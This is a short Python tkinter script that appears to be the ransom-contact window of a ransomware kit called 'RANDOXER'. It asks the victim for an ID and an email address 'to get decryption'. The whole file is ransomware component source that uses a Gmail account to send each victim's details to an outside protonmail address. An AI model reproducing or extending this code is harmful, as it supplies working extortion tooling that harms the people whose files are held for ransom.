import tkinter as tk

root = tk.Tk()

root.geometry("600x400")
root.title("ENTER EMAIL AND RANDOXID TO GET DECRYPTION")

name_var = tk.StringVar()
id_var = tk.StringVar()

def submit():
    name = name_var.get()
    name1 = id_var.get()

    print("The name is : " + name)
    print("The password is : " + name1)

    name_var.set("")
    id_var.set("")
    from redmail import gmail
    gmail.username = 'randoxer@gmail.com'  # Your Gmail address
    gmail.password = 'pass_key'

    # And then you can send emails
    gmail.send(
        subject="DWE | RANDOXER AFFECTED : " + str(name1) + " : ",
        receivers=["dwecloud@protonmail.com"],
        text=("RANDOX ID : "+str(name)+"""
        EMAIL ID : """+str(name1)))
    root.destroy()

name_label = tk.Label(root, text='RANDOX ID : ', font=('calibre', 10, 'bold'))

name_entry = tk.Entry(root, textvariable=name_var, font=('calibre', 10, 'normal'))

id_label = tk.Label(root, text='Email ID : ', font=('calibre', 10, 'bold'))

id_entry = tk.Entry(root, textvariable=id_var, font=('calibre', 10, 'normal'))

sub_btn = tk.Button(root, text='Submit', command=submit)

name_label.grid(row=0, column=0)
name_entry.grid(row=0, column=1)
id_label.grid(row=1, column=0)
id_entry.grid(row=1, column=1)
sub_btn.grid(row=2, column=1)

root.mainloop()
